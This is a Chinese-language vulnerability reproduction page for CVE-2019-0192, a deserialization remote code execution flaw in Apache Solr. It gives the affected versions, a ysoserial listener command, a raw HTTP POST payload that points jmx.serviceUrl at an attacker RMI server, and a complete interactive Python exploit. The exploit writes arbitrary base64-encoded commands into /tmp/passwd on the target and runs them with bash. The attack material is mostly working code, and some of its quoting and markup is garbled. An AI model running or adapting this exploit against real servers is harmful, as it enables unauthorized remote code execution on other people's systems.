---
title: "（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞"
id: zhfly2825
---

# （CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞

## 一、漏洞简介

Apache Solr中的ConfigAPI允许设置一个jmx.serviceUrl，它将创建一个新的JMXConnectorServerFactory，并通过“绑定”操作触发对目标RMI/LDAP服务器的调用。恶意的RMI服务器可以响应任意的对象，这些对象将在Solr端使用java的ObjectInputStream反序列化，这被认为是不安全的。这种类型的漏洞可以利用ysoserial工具。根据目标类路径，攻击者可以使用其中一个“gadget chain”来触发Solr端上的远程代码执行。

## 二、漏洞影响

Apache Solr 5.0.0 to 5.5.5

Apache Solr 6.0.0 to 6.6.5

## 三、复现过程

下载Apache Solr 5.5.3版本作为靶机（注意，一定要使用jre7u25以下jre），执行**solr -e techproducts -Dcom.sun.management.jmxremote**指令开启服务。

使用ysoserial工具，执行**Java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12363 Jdk7u21 "calc"**指令，监听***12363***端口。然后传入以下数据：

```
POST /solr/techproducts/config HTTP/1.1

Host: [0-sec.org:8983](http://0-sec.org:8983)

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Content-type:application/json

Connection: close

Upgrade-Insecure-Requests: 1

Content-Length: 91 `{“set-property” : {“jmx.serviceUrl” : “service:jmx:rmi:///jndi/rmi://127.0.0.1:12363/obj”}}` 
```

### poc

下载[yoserial](http://wiki.0-sec.org/download/yoserial.zip),并将value修改为一下内容

```
remote = "http://172.18.0.5:8983"
ressource = ""
RHOST = "172.18.0.1"
RPORT = "1099" 
```

然后执行一下脚本

```
import base64
import requests
import subprocess
import signal
import sys
import os
import time
import re

remote = “[http://172.18.0.5:8983](http://172.18.0.5:8983)”

ressource = “”

RHOST = “172.18.0.1”

RPORT = “1099”

proxy = {

}

def exploit(command):

print("\n Run the malicious RMI server using yoserial by running this command:")

print("\n java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener " + RPORT + " Jdk7u21" + command)

if **name** == “**main**”:

print("\nCVE-2019-0192 - Apache Solr RCE 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5\n")

print("[+] Checking if ressource available =>", end=’ ')

```
burp0_url = remote + "/solr/admin/cores?wt=json"
r = requests.get(burp0_url, proxies=proxy, verify=False, allow_redirects=False)
if r.status_code == 200:
    if r.json()['status'] == "":
        print("KO")
        sys.exit()
    else:
        a = list(r.json()['status'].keys())
        ressource = "/solr/" + a[0] + "/config"
        print(ressource)
else:
    print("KO")
    sys.exit()

while True:
    try:
        command = input("command (\033[92mnot reflected\033[0m)&gt; ")
        if command == "exit":
            print("Exiting...")
            break
        command = base64.b64encode(command.encode('utf-8'))
        command_str = command.decode('utf-8')
        command_str = command_str.replace('/', '+')

        pro = subprocess.Popen(
            "java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener " + RPORT + " Jdk7u21 'cp /etc/passwd /tmp/passwd'", stdout=subprocess.PIPE,shell=True, preexec_fn=os.setsid)

        print("[+] Copy file to tmp directory =&gt;", end=' ')
        burp0_url = remote + ressource
        burp0_headers = {"Content-Type": "application/json"}
        burp0_json = {
            "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + RHOST + ":" + RPORT + "/obj"}}
        r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
        if r.status_code == 500:
            m = re.search('(undeclared checked exception; nested exception is)', r.text)
            if m:
                print("\033[92mOK\033[0m")
            else:
                print("\n[-] Error")
                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
                sys.exit()
        else:
            print("KO")
            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
            sys.exit()
        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
        time.sleep(3)

        pro = subprocess.Popen(
            "java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener " + RPORT + " Jdk7u21 'sed -i 1cpwn /tmp/passwd'", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        print("[+] Preparing file =&gt;", end=' ')
        burp0_url = remote + ressource
        burp0_headers = {"Content-Type": "application/json"}
        burp0_json = {
            "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + RHOST + ":" + RPORT + "/obj"}}
        r = requests.post(
            burp0_url, headers=burp0_headers, json=burp0_json)
        if r.status_code == 500:
            print("\033[92mOK\033[0m")
        else:
            print("KO")
            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
            sys.exit()
        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
        time.sleep(3)

        pro = subprocess.Popen(
            "java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener " + RPORT + " Jdk7u21 'sed -i /[^pwn]/d /tmp/passwd'", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        print("[+] Cleaning temp file =&gt;", end=' ')
        burp0_url = remote + ressource
        burp0_headers = {"Content-Type": "application/json"}
        burp0_json = {
            "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + RHOST + ":" + RPORT + "/obj"}}
        r = requests.post(
            burp0_url, headers=burp0_headers, json=burp0_json)
        if r.status_code == 500:
            print("\033[92mOK\033[0m")
        else:
            print("KO")
            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
            sys.exit()
        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
        time.sleep(3)

        pro = subprocess.Popen(
            "java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener " + RPORT + " Jdk7u21 'sed -i 1s/pwn/{echo," +
            command_str + "}|{base64,-d}&gt;pwn.txt/g /tmp/passwd'", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        print("[+] Writing command into temp file =&gt;", end=' ')
        burp0_url = remote + ressource
        burp0_headers = {"Content-Type": "application/json"}
        burp0_json = {
            "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + RHOST + ":" + RPORT + "/obj"}}
        r = requests.post(
            burp0_url, headers=burp0_headers, json=burp0_json)
        if r.status_code == 500:
            print("\033[92mOK\033[0m")
        else:
            print("KO")
            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
            sys.exit()
        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
        time.sleep(3)

        pro = subprocess.Popen(
            "java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener " + RPORT + " Jdk7u21 'bash /tmp/passwd'", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        print("[+] Decode base64 command =&gt;", end=' ')
        burp0_url = remote + ressource
        burp0_headers = {"Content-Type": "application/json"}
        burp0_json = {
            "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + RHOST + ":" + RPORT + "/obj"}}
        r = requests.post(
            burp0_url, headers=burp0_headers, json=burp0_json)
        if r.status_code == 500:
            print("\033[92mOK\033[0m")
        else:
            print("KO")
            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
            sys.exit()
        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
        time.sleep(3)

        pro = subprocess.Popen(
            "java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener " + RPORT + " Jdk7u21 'bash pwn.txt'", stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

        print("[+] Executing command =&gt;", end=' ')
        burp0_url = remote + ressource
        burp0_headers = {"Content-Type": "application/json"}
        burp0_json = {
            "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + RHOST + ":" + RPORT + "/obj"}}
        r = requests.post(
            burp0_url, headers=burp0_headers, json=burp0_json)
        if r.status_code == 500:
            print("\033[92mOK\033[0m")
        else:
            print("KO")
            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
            sys.exit()
        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
        time.sleep(3)

    except KeyboardInterrupt:
        print("Exiting...")
        break 
``` 
```

## 参考链接

> https://github.com/mpgn/CVE-2019-0192

> https://mp.weixin.qq.com/s?__biz=MzI4NjE2NjgxMQ==&mid=2650237094&idx=1&sn=4125bf632680d991f38f9f147657b38d&chksm=f3e2d2d2c4955bc4894b3098ca11cbe7d9917c23e173c87b7fe2f02c84b195aea381746567a3&scene=21#wechat_redirect